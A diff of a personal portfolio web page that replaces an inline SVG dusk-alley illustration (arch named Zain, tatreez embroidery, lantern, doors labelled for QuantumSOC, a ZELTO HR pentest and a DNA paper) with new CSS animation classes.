+@keyframes steam{0%{opacity:0;transform:translateY(10px)}30%{opacity:.7}100%{opacity:0;transform:translateY(-40px)}}
+.cookie{cursor:pointer;transition:opacity .3s,transform .3s}
+.cookie.taken{opacity:0;transform:translateY(-20px)}
+.bloch{width:min(360px,86vw);height:auto;display:block;margin:0 auto}
+.bloch .vec{transition:all .6s ease}
+.qstate{font-family:var(--mono);text-align:center;font-size:1rem;color:var(--ink)}
+.chalk{font-family:var(--arabic);color:#e9e4d6}
+.purr{position:absolute;font-family:var(--body);font-style:italic;color:var(--lantern);pointer-events:none;animation:rise 1.8s ease-out forwards;font-size:1.1rem}
+@keyframes rise{from{opacity:1;transform:translateY(0)}to{opacity:0;transform:translateY(-60px)}}
+.board-note{background:var(--paper);color:var(--paper-ink);padding:22px 24px;border-radius:2px;transform:rotate(.5deg);box-shadow:0 20px 40px -20px #000;max-width:30rem;margin:0 auto}
+.board-note a{color:var(--rust)}
+
 @media (prefers-reduced-motion:reduce){
-  *{animation:none!important;transition:none!important}
-  #cat{transform:translate(560px,0)!important}
+  *,*::before,*::after{animation:none!important;transition:none!important}
 }
 </style>
 
-<section class="scene" aria-label="An old Levantine alley at dusk. An old man reads on a wooden chair by the first door while a black cat with yellow eyes walks in and sits under an arch carved with the name Zain.">
-<svg viewBox="0 0 1200 720" preserveAspectRatio="xMidYMax slice" role="img" aria-labelledby="scn-t">
-  <title id="scn-t">Zain — a dusk alley, an old man reading, a cat</title>
+<svg width="0" height="0" style="position:absolute" aria-hidden="true">
   <defs>
-    <linearGradient id="sky" x1="0" y1="0" x2="0" y2="1">
-      <stop offset="0" stop-color="#141a2e"/><stop offset=".55" stop-color="#2a2440"/><stop offset=".85" stop-color="#6b4a5a"/><stop offset="1" stop-color="#b9785c"/>
-    </linearGradient>
-    <linearGradient id="wallL" x1="0" x2="1"><stop offset="0" stop-color="#8f7f64"/><stop offset="1" stop-color="#c9b896"/></linearGradient>
-    <linearGradient id="wallR" x1="1" x2="0"><stop offset="0" stop-color="#8a7a60"/><stop offset="1" stop-color="#c4b391"/></linearGradient>
-    <radialGradient id="lamp" cx=".5" cy=".5" r=".5"><stop offset="0" stop-color="#f1b75a" stop-opacity=".75"/><stop offset="1" stop-color="#f1b75a" stop-opacity="0"/></radialGradient>
-    <pattern id="mash" width="14" height="14" patternUnits="userSpaceOnUse">
-      <rect width="14" height="14" fill="#3b2a1c"/><circle cx="7" cy="7" r="4" fill="none" stroke="#6b4c30" stroke-width="2"/><path d="M0 7h14M7 0v14" stroke="#4f3823" stroke-width="1.5"/>
-    </pattern>
-    <pattern id="cob" width="44" height="22" patternUnits="userSpaceOnUse">
-      <rect width="44" height="22" fill="#5d5242"/><rect x="2" y="2" width="40" height="8" rx="4" fill="#6c604d"/><rect x="-20" y="12" width="40" height="8" rx="4" fill="#665a48"/><rect x="24" y="12" width="40" height="8" rx="4" fill="#665a48"/>
-    </pattern>
-    <pattern id="tilepat" width="24" height="24" patternUnits="userSpaceOnUse">
-      <rect width="24" height="24" fill="#2f7f7a"/><path d="M12 2l10 10-10 10L2 12z" fill="#e9dcc0"/><circle cx="12" cy="12" r="3" fill="#b35a3c"/>
-    </pattern>
-  </defs>
-
-  <rect width="1200" height="720" fill="url(#sky)"/>
-  <!-- stars -->
-  <g fill="#ece3cf" opacity=".7"><circle cx="140" cy="60" r="1.2"/><circle cx="320" cy="110" r="1"/><circle cx="520" cy="40" r="1.4"/><circle cx="760" cy="90" r="1"/><circle cx="980" cy="55" r="1.3"/><circle cx="1100" cy="140" r="1"/><circle cx="640" cy="150" r=".9"/></g>
-  <!-- crescent -->
-  <path d="M930 120a34 34 0 1 0 30 52 28 28 0 1 1-30-52z" fill="#ece3cf" opacity=".9"/>
-
-  <!-- distant rooftops, domes, minaret -->
-  <g fill="#231f36">
-    <rect x="300" y="360" width="600" height="200"/>
-    <path d="M360 360a50 50 0 0 1 100 0z"/><rect x="405" y="290" width="10" height="24"/>
-    <path d="M700 360a70 70 0 0 1 140 0z"/><rect x="765" y="270" width="10" height="22"/>
-    <rect x="560" y="210" width="28" height="160"/><path d="M552 214h44l-22-34z"/><rect x="556" y="250" width="36" height="8"/>
-    <rect x="470" y="330" width="80" height="40"/><rect x="620" y="320" width="70" height="50"/>
-  </g>
-
-  <!-- left wall with mashrabiya and lantern -->
-  <path d="M0 0h330l-20 720H0z" fill="url(#wallL)"/>
-  <g stroke="#7a6a52" stroke-width="1.2" opacity=".55"><path d="M0 120h318M0 240h314M0 360h311M0 480h309M0 600h307"/><path d="M90 0v120M210 120v120M60 240v120M180 360v120M260 480v120M120 600v120"/></g>
-  <rect x="70" y="160" width="170" height="190" fill="#3b2a1c"/>
-  <rect x="80" y="170" width="150" height="170" fill="url(#mash)"/>
-  <rect x="80" y="170" width="150" height="170" fill="#f1b75a" opacity=".12" class="glow"/>
-  <rect x="64" y="348" width="182" height="10" fill="#4f3823"/>
-  <path d="M300 250h-40v8" stroke="#2b2117" stroke-width="4" fill="none"/>
-  <circle cx="260" cy="300" r="90" fill="url(#lamp)" class="flicker"/>
-  <path d="M248 262h24l6 22-6 34h-24l-6-34z" fill="#f1b75a" class="flicker"/><path d="M248 262h24l6 22-6 34h-24l-6-34z" fill="none" stroke="#2b2117" stroke-width="3"/><path d="M252 256h16v6h-16z" fill="#2b2117"/>
-
-  <!-- right wall with tatreez and jasmine -->
-  <path d="M870 0h330v720H890z" fill="url(#wallR)"/>
-  <g stroke="#7a6a52" stroke-width="1.2" opacity=".55"><path d="M875 140h325M880 280h320M884 420h316M888 560h312"/><path d="M1000 0v140M940 140v140M1080 280v140M960 420v140M1120 560v160"/></g>
-  <!-- tatreez in the Jenin manner: white cloth, vertical multicolour stripes, a band of cross-stitch -->
-  <g id="tatreez" aria-hidden="true">
-  <path d="M950 186h188" stroke="#4f3823" stroke-width="5" stroke-linecap="round"/>
-  <rect x="960" y="190" width="168" height="104" fill="#f2ede1"/>
-  <rect x="963" y="190" width="2.2" height="104" fill="#a3222b" opacity=".55"/>
-  <rect x="972" y="190" width="2.2" height="104" fill="#3e6b3a" opacity=".55"/>
-  <rect x="981" y="190" width="2.2" height="104" fill="#c99a2e" opacity=".55"/>
-  <rect x="990" y="190" width="2.2" height="104" fill="#2c3f73" opacity=".55"/>
-  <rect x="999" y="190" width="2.2" height="104" fill="#6a2e5e" opacity=".55"/>
-  <rect x="1008" y="190" width="2.2" height="104" fill="#a3222b" opacity=".55"/>
-  <rect x="1017" y="190" width="2.2" height="104" fill="#3e6b3a" opacity=".55"/>
-  <rect x="1026" y="190" width="2.2" height="104" fill="#c99a2e" opacity=".55"/>
-  <rect x="1035" y="190" width="2.2" height="104" fill="#2c3f73" opacity=".55"/>
-  <rect x="1044" y="190" width="2.2" height="104" fill="#6a2e5e" opacity=".55"/>
-  <rect x="1053" y="190" width="2.2" height="104" fill="#a3222b" opacity=".55"/>
-  <rect x="1062" y="190" width="2.2" height="104" fill="#3e6b3a" opacity=".55"/>
-  <rect x="1071" y="190" width="2.2" height="104" fill="#c99a2e" opacity=".55"/>
-  <rect x="1080" y="190" width="2.2" height="104" fill="#2c3f73" opacity=".55"/>
-  <rect x="1089" y="190" width="2.2" height="104" fill="#6a2e5e" opacity=".55"/>
-  <rect x="1098" y="190" width="2.2" height="104" fill="#a3222b" opacity=".55"/>
-  <rect x="1107" y="190" width="2.2" height="104" fill="#3e6b3a" opacity=".55"/>
-  <rect x="1116" y="190" width="2.2" height="104" fill="#c99a2e" opacity=".55"/>
-  <rect x="1125" y="190" width="2.2" height="104" fill="#2c3f73" opacity=".55"/>
-  <rect x="960" y="212" width="168" height="50" fill="#f2ede1"/>
-  <rect x="960" y="190" width="168" height="104" fill="none" stroke="#c9b68f" stroke-width="1"/>
-  <path d="M984.6 218.6l2.8 2.8m0 -2.8l-2.8 2.8M992.6 218.6l2.8 2.8m0 -2.8l-2.8 2.8M980.6 222.6l2.8 2.8m0 -2.8l-2.8 2.8M984.6 222.6l2.8 2.8m0 -2.8l-2.8 2.8M992.6 222.6l2.8 2.8m0 -2.8l-2.8 2.8M996.6 222.6l2.8 2.8m0 -2.8l-2.8 2.8M976.6 226.6l2.8 2.8m0 -2.8l-2.8 2.8M980.6 226.6l2.8 2.8m0 -2.8l-2.8 2.8M984.6 226.6l2.8 2.8m0 -2.8l-2.8 2.8M992.6 226.6l2.8 2.8m0 -2.8l-2.8 2.8M996.6 226.6l2.8 2.8m0 -2.8l-2.8 2.8M1000.6 226.6l2.8 2.8m0 -2.8l-2.8 2.8M968.6 230.6l2.8 2.8m0 -2.8l-2.8 2.8M972.6 230.6l2.8 2.8m0 -2.8l-2.8 2.8M976.6 230.6l2.8 2.8m0 -2.8l-2.8 2.8M980.6 230.6l2.8 2.8m0 -2.8l-2.8 2.8M996.6 230.6l2.8 2.8m0 -2.8l-2.8 2.8M1000.6 230.6l2.8 2.8m0 -2.8l-2.8 2.8M1004.6 230.6l2.8 2.8m0 -2.8l-2.8 2.8M1008.6 230.6l2.8 2.8m0 -2.8l-2.8 2.8M972.6 234.6l2.8 2.8m0 -2.8l-2.8 2.8M976.6 234.6l2.8 2.8m0 -2.8l-2.8 2.8M1000.6 234.6l2.8 2.8m0 -2.8l-2.8 2.8M1004.6 234.6l2.8 2.8m0 -2.8l-2.8 2.8M972.6 242.6l2.8 2.8m0 -2.8l-2.8 2.8M976.6 242.6l2.8 2.8m0 -2.8l-2.8 2.8M1000.6 242.6l2.8 2.8m0 -2.8l-2.8 2.8M1004.6 242.6l2.8 2.8m0 -2.8l-2.8 2.8M968.6 246.6l2.8 2.8m0 -2.8l-2.8 2.8M972.6 246.6l2.8 2.8m0 -2.8l-2.8 2.8M976.6 246.6l2.8 2.8m0 -2.8l-2.8 2.8M980.6 246.6l2.8 2.8m0 -2.8l-2.8 2.8M996.6 246.6l2.8 2.8m0 -2.8l-2.8 2.8M1000.6 246.6l2.8 2.8m0 -2.8l-2.8 2.8M1004.6 246.6l2.8 2.8m0 -2.8l-2.8 2.8M1008.6 246.6l2.8 2.8m0 -2.8l-2.8 2.8M976.6 250.6l2.8 2.8m0 -2.8l-2.8 2.8M980.6 250.6l2.8 2.8m0 -2.8l-2.8 2.8M984.6 250.6l2.8 2.8m0 -2.8l-2.8 2.8M992.6 250.6l2.8 2.8m0 -2.8l-2.8 2.8M996.6 250.6l2.8 2.8m0 -2.8l-2.8 2.8M1000.6 250.6l2.8 2.8m0 -2.8l-2.8 2.8M980.6 254.6l2.8 2.8m0 -2.8l-2.8 2.8M984.6 254.6l2.8 2.8m0 -2.8l-2.8 2.8M992.6 254.6l2.8 2.8m0 -2.8l-2.8 2.8M996.6 254.6l2.8 2.8m0 -2.8l-2.8 2.8M984.6 258.6l2.8 2.8m0 -2.8l-2.8 2.8M992.6 258.6l2.8 2.8m0 -2.8l-2.8 2.8M1040.6 218.6l2.8 2.8m0 -2.8l-2.8 2.8M1048.6 218.6l2.8 2.8m0 -2.8l-2.8 2.8M1036.6 222.6l2.8 2.8m0 -2.8l-2.8 2.8M1040.6 222.6l2.8 2.8m0 -2.8l-2.8 2.8M1048.6 222.6l2.8 2.8m0 -2.8l-2.8 2.8M1052.6 222.6l2.8 2.8m0 -2.8l-2.8 2.8M1032.6 226.6l2.8 2.8m0 -2.8l-2.8 2.8M1036.6 226.6l2.8 2.8m0 -2.8l-2.8 2.8M1040.6 226.6l2.8 2.8m0 -2.8l-2.8 2.8M1048.6 226.6l2.8 2.8m0 -2.8l-2.8 2.8M1052.6 226.6l2.8 2.8m0 -2.8l-2.8 2.8M1056.6 226.6l2.8 2.8m0 -2.8l-2.8 2.8M1024.6 230.6l2.8 2.8m0 -2.8l-2.8 2.8M1028.6 230.6l2.8 2.8m0 -2.8l-2.8 2.8M1032.6 230.6l2.8 2.8m0 -2.8l-2.8 2.8M1036.6 230.6l2.8 2.8m0 -2.8l-2.8 2.8M1052.6 230.6l2.8 2.8m0 -2.8l-2.8 2.8M1056.6 230.6l2.8 2.8m0 -2.8l-2.8 2.8M1060.6 230.6l2.8 2.8m0 -2.8l-2.8 2.8M1064.6 230.6l2.8 2.8m0 -2.8l-2.8 2.8M1028.6 234.6l2.8 2.8m0 -2.8l-2.8 2.8M1032.6 234.6l2.8 2.8m0 -2.8l-2.8 2.8M1056.6 234.6l2.8 2.8m0 -2.8l-2.8 2.8M1060.6 234.6l2.8 2.8m0 -2.8l-2.8 2.8M1028.6 242.6l2.8 2.8m0 -2.8l-2.8 2.8M1032.6 242.6l2.8 2.8m0 -2.8l-2.8 2.8M1056.6 242.6l2.8 2.8m0 -2.8l-2.8 2.8M1060.6 242.6l2.8 2.8m0 -2.8l-2.8 2.8M1024.6 246.6l2.8 2.8m0 -2.8l-2.8 2.8M1028.6 246.6l2.8 2.8m0 -2.8l-2.8 2.8M1032.6 246.6l2.8 2.8m0 -2.8l-2.8 2.8M1036.6 246.6l2.8 2.8m0 -2.8l-2.8 2.8M1052.6 246.6l2.8 2.8m0 -2.8l-2.8 2.8M1056.6 246.6l2.8 2.8m0 -2.8l-2.8 2.8M1060.6 246.6l2.8 2.8m0 -2.8l-2.8 2.8M1064.6 246.6l2.8 2.8m0 -2.8l-2.8 2.8M1032.6 250.6l2.8 2.8m0 -2.8l-2.8 2.8M1036.6 250.6l2.8 2.8m0 -2.8l-2.8 2.8M1040.6 250.6l2.8 2.8m0 -2.8l-2.8 2.8M1048.6 250.6l2.8 2.8m0 -2.8l-2.8 2.8M1052.6 250.6l2.8 2.8m0 -2.8l-2.8 2.8M1056.6 250.6l2.8 2.8m0 -2.8l-2.8 2.8M1036.6 254.6l2.8 2.8m0 -2.8l-2.8 2.8M1040.6 254.6l2.8 2.8m0 -2.8l-2.8 2.8M1048.6 254.6l2.8 2.8m0 -2.8l-2.8 2.8M1052.6 254.6l2.8 2.8m0 -2.8l-2.8 2.8M1040.6 258.6l2.8 2.8m0 -2.8l-2.8 2.8M1048.6 258.6l2.8 2.8m0 -2.8l-2.8 2.8M1096.6 218.6l2.8 2.8m0 -2.8l-2.8 2.8M1104.6 218.6l2.8 2.8m0 -2.8l-2.8 2.8M1092.6 222.6l2.8 2.8m0 -2.8l-2.8 2.8M1096.6 222.6l2.8 2.8m0 -2.8l-2.8 2.8M1104.6 222.6l2.8 2.8m0 -2.8l-2.8 2.8M1108.6 222.6l2.8 2.8m0 -2.8l-2.8 2.8M1088.6 226.6l2.8 2.8m0 -2.8l-2.8 2.8M1092.6 226.6l2.8 2.8m0 -2.8l-2.8 2.8M1096.6 226.6l2.8 2.8m0 -2.8l-2.8 2.8M1104.6 226.6l2.8 2.8m0 -2.8l-2.8 2.8M1108.6 226.6l2.8 2.8m0 -2.8l-2.8 2.8M1112.6 226.6l2.8 2.8m0 -2.8l-2.8 2.8M1080.6 230.6l2.8 2.8m0 -2.8l-2.8 2.8M1084.6 230.6l2.8 2.8m0 -2.8l-2.8 2.8M1088.6 230.6l2.8 2.8m0 -2.8l-2.8 2.8M1092.6 230.6l2.8 2.8m0 -2.8l-2.8 2.8M1108.6 230.6l2.8 2.8m0 -2.8l-2.8 2.8M1112.6 230.6l2.8 2.8m0 -2.8l-2.8 2.8M1116.6 230.6l2.8 2.8m0 -2.8l-2.8 2.8M1120.6 230.6l2.8 2.8m0 -2.8l-2.8 2.8M1084.6 234.6l2.8 2.8m0 -2.8l-2.8 2.8M1088.6 234.6l2.8 2.8m0 -2.8l-2.8 2.8M1112.6 234.6l2.8 2.8m0 -2.8l-2.8 2.8M1116.6 234.6l2.8 2.8m0 -2.8l-2.8 2.8M1084.6 242.6l2.8 2.8m0 -2.8l-2.8 2.8M1088.6 242.6l2.8 2.8m0 -2.8l-2.8 2.8M1112.6 242.6l2.8 2.8m0 -2.8l-2.8 2.8M1116.6 242.6l2.8 2.8m0 -2.8l-2.8 2.8M1080.6 246.6l2.8 2.8m0 -2.8l-2.8 2.8M1084.6 246.6l2.8 2.8m0 -2.8l-2.8 2.8M1088.6 246.6l2.8 2.8m0 -2.8l-2.8 2.8M1092.6 246.6l2.8 2.8m0 -2.8l-2.8 2.8M1108.6 246.6l2.8 2.8m0 -2.8l-2.8 2.8M1112.6 246.6l2.8 2.8m0 -2.8l-2.8 2.8M1116.6 246.6l2.8 2.8m0 -2.8l-2.8 2.8M1120.6 246.6l2.8 2.8m0 -2.8l-2.8 2.8M1088.6 250.6l2.8 2.8m0 -2.8l-2.8 2.8M1092.6 250.6l2.8 2.8m0 -2.8l-2.8 2.8M1096.6 250.6l2.8 2.8m0 -2.8l-2.8 2.8M1104.6 250.6l2.8 2.8m0 -2.8l-2.8 2.8M1108.6 250.6l2.8 2.8m0 -2.8l-2.8 2.8M1112.6 250.6l2.8 2.8m0 -2.8l-2.8 2.8M1092.6 254.6l2.8 2.8m0 -2.8l-2.8 2.8M1096.6 254.6l2.8 2.8m0 -2.8l-2.8 2.8M1104.6 254.6l2.8 2.8m0 -2.8l-2.8 2.8M1108.6 254.6l2.8 2.8m0 -2.8l-2.8 2.8M1096.6 258.6l2.8 2.8m0 -2.8l-2.8 2.8M1104.6 258.6l2.8 2.8m0 -2.8l-2.8 2.8" stroke="#a3222b" stroke-width="1.3" stroke-linecap="round" fill="none"/>
-  <path d="M988.6 238.6l2.8 2.8m0 -2.8l-2.8 2.8M1044.6 238.6l2.8 2.8m0 -2.8l-2.8 2.8M1100.6 238.6l2.8 2.8m0 -2.8l-2.8 2.8" stroke="#2a1a1c" stroke-width="1.3" stroke-linecap="round" fill="none"/>
-  <path d="M988.6 226.6l2.8 2.8m0 -2.8l-2.8 2.8M988.6 230.6l2.8 2.8m0 -2.8l-2.8 2.8M984.6 234.6l2.8 2.8m0 -2.8l-2.8 2.8M992.6 234.6l2.8 2.8m0 -2.8l-2.8 2.8M976.6 238.6l2.8 2.8m0 -2.8l-2.8 2.8M980.6 238.6l2.8 2.8m0 -2.8l-2.8 2.8M996.6 238.6l2.8 2.8m0 -2.8l-2.8 2.8M1000.6 238.6l2.8 2.8m0 -2.8l-2.8 2.8M984.6 242.6l2.8 2.8m0 -2.8l-2.8 2.8M992.6 242.6l2.8 2.8m0 -2.8l-2.8 2.8M988.6 246.6l2.8 2.8m0 -2.8l-2.8 2.8M988.6 250.6l2.8 2.8m0 -2.8l-2.8 2.8M1044.6 226.6l2.8 2.8m0 -2.8l-2.8 2.8M1044.6 230.6l2.8 2.8m0 -2.8l-2.8 2.8M1040.6 234.6l2.8 2.8m0 -2.8l-2.8 2.8M1048.6 234.6l2.8 2.8m0 -2.8l-2.8 2.8M1032.6 238.6l2.8 2.8m0 -2.8l-2.8 2.8M1036.6 238.6l2.8 2.8m0 -2.8l-2.8 2.8M1052.6 238.6l2.8 2.8m0 -2.8l-2.8 2.8M1056.6 238.6l2.8 2.8m0 -2.8l-2.8 2.8M1040.6 242.6l2.8 2.8m0 -2.8l-2.8 2.8M1048.6 242.6l2.8 2.8m0 -2.8l-2.8 2.8M1044.6 246.6l2.8 2.8m0 -2.8l-2.8 2.8M1044.6 250.6l2.8 2.8m0 -2.8l-2.8 2.8M1100.6 226.6l2.8 2.8m0 -2.8l-2.8 2.8M1100.6 230.6l2.8 2.8m0 -2.8l-2.8 2.8M1096.6 234.6l2.8 2.8m0 -2.8l-2.8 2.8M1104.6 234.6l2.8 2.8m0 -2.8l-2.8 2.8M1088.6 238.6l2.8 2.8m0 -2.8l-2.8 2.8M1092.6 238.6l2.8 2.8m0 -2.8l-2.8 2.8M1108.6 238.6l2.8 2.8m0 -2.8l-2.8 2.8M1112.6 238.6l2.8 2.8m0 -2.8l-2.8 2.8M1096.6 242.6l2.8 2.8m0 -2.8l-2.8 2.8M1104.6 242.6l2.8 2.8m0 -2.8l-2.8 2.8M1100.6 246.6l2.8 2.8m0 -2.8l-2.8 2.8M1100.6 250.6l2.8 2.8m0 -2.8l-2.8 2.8" stroke="#3e6b3a" stroke-width="1.3" stroke-linecap="round" fill="none"/>
-  <path d="M988.6 234.6l2.8 2.8m0 -2.8l-2.8 2.8M984.6 238.6l2.8 2.8m0 -2.8l-2.8 2.8M992.6 238.6l2.8 2.8m0 -2.8l-2.8 2.8M988.6 242.6l2.8 2.8m0 -2.8l-2.8 2.8M1044.6 234.6l2.8 2.8m0 -2.8l-2.8 2.8M1040.6 238.6l2.8 2.8m0 -2.8l-2.8 2.8M1048.6 238.6l2.8 2.8m0 -2.8l-2.8 2.8M1044.6 242.6l2.8 2.8m0 -2.8l-2.8 2.8M1100.6 234.6l2.8 2.8m0 -2.8l-2.8 2.8M1096.6 238.6l2.8 2.8m0 -2.8l-2.8 2.8M1104.6 238.6l2.8 2.8m0 -2.8l-2.8 2.8M1100.6 242.6l2.8 2.8m0 -2.8l-2.8 2.8M1016.6 234.6l2.8 2.8m0 -2.8l-2.8 2.8M1012.6 238.6l2.8 2.8m0 -2.8l-2.8 2.8M1020.6 238.6l2.8 2.8m0 -2.8l-2.8 2.8M1016.6 242.6l2.8 2.8m0 -2.8l-2.8 2.8M1072.6 234.6l2.8 2.8m0 -2.8l-2.8 2.8M1068.6 238.6l2.8 2.8m0 -2.8l-2.8 2.8M1076.6 238.6l2.8 2.8m0 -2.8l-2.8 2.8M1072.6 242.6l2.8 2.8m0 -2.8l-2.8 2.8" stroke="#c99a2e" stroke-width="1.3" stroke-linecap="round" fill="none"/>
-  <path d="M960.6 206.6l2.8 2.8m0 -2.8l-2.8 2.8M964.6 202.6l2.8 2.8m0 -2.8l-2.8 2.8M968.6 206.6l2.8 2.8m0 -2.8l-2.8 2.8M976.6 206.6l2.8 2.8m0 -2.8l-2.8 2.8M980.6 202.6l2.8 2.8m0 -2.8l-2.8 2.8M984.6 206.6l2.8 2.8m0 -2.8l-2.8 2.8M992.6 206.6l2.8 2.8m0 -2.8l-2.8 2.8M996.6 202.6l2.8 2.8m0 -2.8l-2.8 2.8M1000.6 206.6l2.8 2.8m0 -2.8l-2.8 2.8M1008.6 206.6l2.8 2.8m0 -2.8l-2.8 2.8M1012.6 202.6l2.8 2.8m0 -2.8l-2.8 2.8M1016.6 206.6l2.8 2.8m0 -2.8l-2.8 2.8M1024.6 206.6l2.8 2.8m0 -2.8l-2.8 2.8M1028.6 202.6l2.8 2.8m0 -2.8l-2.8 2.8M1032.6 206.6l2.8 2.8m0 -2.8l-2.8 2.8M1040.6 206.6l2.8 2.8m0 -2.8l-2.8 2.8M1044.6 202.6l2.8 2.8m0 -2.8l-2.8 2.8M1048.6 206.6l2.8 2.8m0 -2.8l-2.8 2.8M1056.6 206.6l2.8 2.8m0 -2.8l-2.8 2.8M1060.6 202.6l2.8 2.8m0 -2.8l-2.8 2.8M1064.6 206.6l2.8 2.8m0 -2.8l-2.8 2.8M1072.6 206.6l2.8 2.8m0 -2.8l-2.8 2.8M1076.6 202.6l2.8 2.8m0 -2.8l-2.8 2.8M1080.6 206.6l2.8 2.8m0 -2.8l-2.8 2.8M1088.6 206.6l2.8 2.8m0 -2.8l-2.8 2.8M1092.6 202.6l2.8 2.8m0 -2.8l-2.8 2.8M1096.6 206.6l2.8 2.8m0 -2.8l-2.8 2.8M1104.6 206.6l2.8 2.8m0 -2.8l-2.8 2.8M1108.6 202.6l2.8 2.8m0 -2.8l-2.8 2.8M1112.6 206.6l2.8 2.8m0 -2.8l-2.8 2.8M1120.6 206.6l2.8 2.8m0 -2.8l-2.8 2.8M1124.6 202.6l2.8 2.8m0 -2.8l-2.8 2.8" stroke="#2c3f73" stroke-width="1.3" stroke-linecap="round" fill="none"/>
-  <path d="M960.6 270.6l2.8 2.8m0 -2.8l-2.8 2.8M964.6 274.6l2.8 2.8m0 -2.8l-2.8 2.8M968.6 270.6l2.8 2.8m0 -2.8l-2.8 2.8M976.6 270.6l2.8 2.8m0 -2.8l-2.8 2.8M980.6 274.6l2.8 2.8m0 -2.8l-2.8 2.8M984.6 270.6l2.8 2.8m0 -2.8l-2.8 2.8M992.6 270.6l2.8 2.8m0 -2.8l-2.8 2.8M996.6 274.6l2.8 2.8m0 -2.8l-2.8 2.8M1000.6 270.6l2.8 2.8m0 -2.8l-2.8 2.8M1008.6 270.6l2.8 2.8m0 -2.8l-2.8 2.8M1012.6 274.6l2.8 2.8m0 -2.8l-2.8 2.8M1016.6 270.6l2.8 2.8m0 -2.8l-2.8 2.8M1024.6 270.6l2.8 2.8m0 -2.8l-2.8 2.8M1028.6 274.6l2.8 2.8m0 -2.8l-2.8 2.8M1032.6 270.6l2.8 2.8m0 -2.8l-2.8 2.8M1040.6 270.6l2.8 2.8m0 -2.8l-2.8 2.8M1044.6 274.6l2.8 2.8m0 -2.8l-2.8 2.8M1048.6 270.6l2.8 2.8m0 -2.8l-2.8 2.8M1056.6 270.6l2.8 2.8m0 -2.8l-2.8 2.8M1060.6 274.6l2.8 2.8m0 -2.8l-2.8 2.8M1064.6 270.6l2.8 2.8m0 -2.8l-2.8 2.8M1072.6 270.6l2.8 2.8m0 -2.8l-2.8 2.8M1076.6 274.6l2.8 2.8m0 -2.8l-2.8 2.8M1080.6 270.6l2.8 2.8m0 -2.8l-2.8 2.8M1088.6 270.6l2.8 2.8m0 -2.8l-2.8 2.8M1092.6 274.6l2.8 2.8m0 -2.8l-2.8 2.8M1096.6 270.6l2.8 2.8m0 -2.8l-2.8 2.8M1104.6 270.6l2.8 2.8m0 -2.8l-2.8 2.8M1108.6 274.6l2.8 2.8m0 -2.8l-2.8 2.8M1112.6 270.6l2.8 2.8m0 -2.8l-2.8 2.8M1120.6 270.6l2.8 2.8m0 -2.8l-2.8 2.8M1124.6 274.6l2.8 2.8m0 -2.8l-2.8 2.8" stroke="#6a2e5e" stroke-width="1.3" stroke-linecap="round" fill="none"/>
-  <path d="M972 294v10" stroke="#a3222b" stroke-width="2.5" stroke-linecap="round"/>
-  <path d="M1008 294v10" stroke="#3e6b3a" stroke-width="2.5" stroke-linecap="round"/>
-  <path d="M1044 294v10" stroke="#c99a2e" stroke-width="2.5" stroke-linecap="round"/>
-  <path d="M1080 294v10" stroke="#2c3f73" stroke-width="2.5" stroke-linecap="round"/>
-  <path d="M1116 294v10" stroke="#6a2e5e" stroke-width="2.5" stroke-linecap="round"/>
-  </g>
-  <g fill="#3f5a2a"><path d="M880 40c60 20 120 0 190 30s90 60 130 40v40c-50 10-80-20-130-40s-120-10-190-30z"/></g>
-  <g fill="#f4efe2"><circle cx="905" cy="62" r="4"/><circle cx="950" cy="70" r="3.5"/><circle cx="1000" cy="82" r="4"/><circle cx="1040" cy="96" r="3.5"/><circle cx="1090" cy="100" r="4"/><circle cx="1140" cy="118" r="3.5"/><circle cx="1180" cy="112" r="4"/><circle cx="975" cy="90" r="3"/><circle cx="1120" cy="132" r="3"/></g>
-
-  <!-- great arch with the name -->
-  <path d="M330 720V360a270 250 0 0 1 540 0v360h-56V372a214 196 0 0 0-428 0v348z" fill="#cdbd99"/>
-  <path d="M386 372a214 196 0 0 1 428 0" fill="none" stroke="#a8977a" stroke-width="3"/>
-  <g fill="none" stroke="#b3a281" stroke-width="2" opacity=".8">
-    <path d="M330 360a270 250 0 0 1 540 0"/>
-    <path d="M356 300l38 16M372 240l36 26M412 186l28 32M466 146l18 36M530 122l8 38M600 112v40M670 122l-8 38M734 146l-18 36M788 186l-28 32M828 240l-36 26M844 300l-38 16"/>
-  </g>
-  <rect x="452" y="116" width="296" height="96" fill="#bfae8a" stroke="#8f7f64" stroke-width="2"/><rect x="460" y="124" width="280" height="80" fill="none" stroke="#a8977a" stroke-width="1"/>
-  <text x="600" y="156" text-anchor="middle" font-family="Marcellus SC, Marcellus, Georgia, serif" font-size="34" letter-spacing="14" fill="#3a2f22">ZAIN</text>
-  <text x="600" y="196" text-anchor="middle" font-family="Aref Ruqaa, Amiri, serif" font-size="28" fill="#4a3a28">زين</text>
-
-  <!-- ground -->
-  <path d="M0 640h1200v80H0z" fill="url(#cob)"/>
-  <path d="M0 640h1200" stroke="#3b3326" stroke-width="3"/>
-
-  <!-- three doors under / beside the arch -->
-  <g class="door" id="d-qsoc" tabindex="0" role="button" aria-label="Open the QuantumSOC door">
-    <rect class="light" x="410" y="440" width="104" height="200" fill="#f1b75a" opacity="0"/>
-    <path class="frame" d="M414 640V490a48 48 0 0 1 96 0v150z" fill="#2f4f5a" stroke="#2b2117" stroke-width="2"/>
-    <path d="M424 640V494a38 38 0 0 1 76 0v146" fill="none" stroke="#24404a" stroke-width="2"/>
-    <circle cx="492" cy="570" r="3.5" fill="#d9a441"/>
-    <rect x="396.0" y="396" width="132" height="44" fill="#d9a441" rx="2"/><rect x="399.0" y="399" width="126" height="38" fill="none" stroke="#a87a2c" stroke-width="1"/><text class="plaque-k" x="462.0" y="413" text-anchor="middle">GRADUATION</text><text class="plaque" x="462.0" y="431" text-anchor="middle">QuantumSOC</text>
-  </g>
-  <g class="door" id="d-zelto" tabindex="0" role="button" aria-label="Open the ZELTO pentest door">
-    <rect class="light" x="548" y="430" width="104" height="210" fill="#f1b75a" opacity="0"/>
-    <path class="frame" d="M552 640V480a48 48 0 0 1 96 0v160z" fill="#5a2f2f" stroke="#2b2117" stroke-width="2"/>
-    <path d="M562 640V484a38 38 0 0 1 76 0v156" fill="none" stroke="#4a2424" stroke-width="2"/>
-    <circle cx="630" cy="566" r="3.5" fill="#d9a441"/>
-    <rect x="534.0" y="386" width="132" height="44" fill="#d9a441" rx="2"/><rect x="537.0" y="389" width="126" height="38" fill="none" stroke="#a87a2c" stroke-width="1"/><text class="plaque-k" x="600.0" y="403" text-anchor="middle">PENTEST</text><text class="plaque" x="600.0" y="421" text-anchor="middle">ZELTO HR</text>
-  </g>
-  <g class="door" id="d-dna" tabindex="0" role="button" aria-label="Open the DNA paper door">
-    <rect class="light" x="686" y="440" width="104" height="200" fill="#f1b75a" opacity="0"/>
